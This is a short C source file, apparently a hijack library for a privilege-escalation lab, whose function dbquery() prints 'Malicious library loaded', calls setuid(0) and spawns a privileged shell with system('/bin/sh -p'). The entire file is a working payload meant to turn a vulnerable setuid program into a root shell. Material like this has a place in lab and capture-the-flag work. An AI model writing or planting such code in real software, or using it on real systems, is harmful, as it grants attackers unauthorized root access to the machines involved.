#include<stdio.h>
#include<stdlib.h>

void dbquery() {
    printf("Pentagon-404 initializing the chain\n");
    sleep(1);
    printf("Malicious library is being prepared!\n");    
    sleep(1);
    printf("Malicious library loaded\n");
    setuid(0);
    system("/bin/sh -p");
} 
